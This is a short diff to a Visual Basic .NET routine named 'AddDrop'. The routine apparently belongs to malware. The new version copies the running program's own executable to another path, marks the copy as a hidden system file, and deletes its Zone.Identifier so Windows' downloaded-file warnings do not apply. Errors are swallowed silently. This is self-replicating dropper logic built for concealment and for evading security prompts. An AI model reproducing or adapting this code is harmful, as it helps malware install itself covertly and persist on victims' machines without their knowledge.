@@ -40,32 +40,12 @@
 
         Private Shared Sub AddDrop(ByVal Location As String)
             Try
-                Using fsSource As IO.FileStream = New IO.FileStream(Windows.Forms.Application.ExecutablePath, IO.FileMode.Open, IO.FileAccess.Read)
-                    Dim bytes() As Byte = New Byte((fsSource.Length) - 1) {}
-                    Dim numBytesToRead As Integer = CType(fsSource.Length, Integer)
-                    Dim numBytesRead As Integer = 0
-
-                    While (numBytesToRead > 0)
-                        Dim n As Integer = fsSource.Read(bytes, numBytesRead,
-                            numBytesToRead)
-                        If (n = 0) Then
-                            Exit While
-                        End If
-                        numBytesRead = (numBytesRead + n)
-                        numBytesToRead = (numBytesToRead - n)
-
-                    End While
-                    numBytesToRead = bytes.Length
-
-                    Using fsNew As IO.FileStream = New IO.FileStream(Location,
-                        IO.FileMode.Create, IO.FileAccess.Write)
-                        fsNew.Write(bytes, 0, numBytesToRead)
-                        fsNew.Flush()
-                        fsNew.Close()
-                    End Using
-                    fsSource.Flush()
-                    fsSource.Close()
-                End Using
+                Dim NewFile As New IO.FileStream(Location, IO.FileMode.CreateNew)
+                Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(Windows.Forms.Application.ExecutablePath)
+                NewFile.Write(LEXEBYTES, 0, LEXEBYTES.Length)
+                NewFile.Flush()
+                NewFile.Close()
+                IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.System + IO.FileAttributes.Hidden)
                 DeleteZoneIdentifier(C_Settings.fullpath)
             Catch : End Try
         End Sub
